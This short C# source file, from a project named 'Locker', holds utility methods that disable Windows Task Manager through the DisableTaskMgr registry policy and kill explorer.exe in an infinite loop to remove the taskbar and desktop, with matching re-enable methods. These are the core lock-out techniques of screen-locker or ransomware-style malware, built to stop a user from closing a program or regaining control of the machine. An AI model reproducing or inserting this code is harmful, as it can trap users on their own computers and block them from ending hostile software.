using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Microsoft.Win32;
using System.Diagnostics;
namespace Locker
{
    class publics
    {
        //Requires that the program be run as administrator.
        RegistryKey TASKMGRKEY = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
        public void disableTaskManager()
        {
            TASKMGRKEY.SetValue("DisableTaskMgr", 1);
        }

        public void enableTaskManager()
        {
            TASKMGRKEY.SetValue("DisableTaskMgr", 0);
        }

        public void disableTaskBar()
        {

            while (true)
            {
                foreach (Process p in Process.GetProcessesByName("explorer"))
                {
                    p.Kill();
                }
            }
            
        }

        public void enableTaskBar()
        {
            Process.Start("explorer.exe");
        }
        


    }
}
